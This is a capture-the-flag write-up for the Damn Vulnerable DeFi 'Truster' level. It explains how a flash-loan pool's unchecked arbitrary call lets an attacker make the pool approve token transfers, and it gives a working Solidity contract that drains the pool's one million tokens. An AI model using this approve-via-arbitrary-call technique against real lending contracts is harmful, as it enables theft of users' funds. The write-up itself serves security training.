# 3 - Truster

## **Problem:**
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## **Solution:**
The flashloan function takes the target contract address as an input, which will be responsible for repaying the debt. The function directly calls target.functionCall(data) from the Address library of OpenZeppelin, without validating the type of contract at the target address.

We exploit this behavior by initiating a flashloan with a borrowed amount of 0 tokens. We pass the address of the token contract as the target and provide the function signature of the approve function as the data. This results in the TrusterLenderPool contract approving tokens to our contract.

With this approval in place, our contract is able to transfer the entire token balance from the pool to itself, effectively bypassing the intended security checks.

### **Code:**
```javascript
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }        
}
```

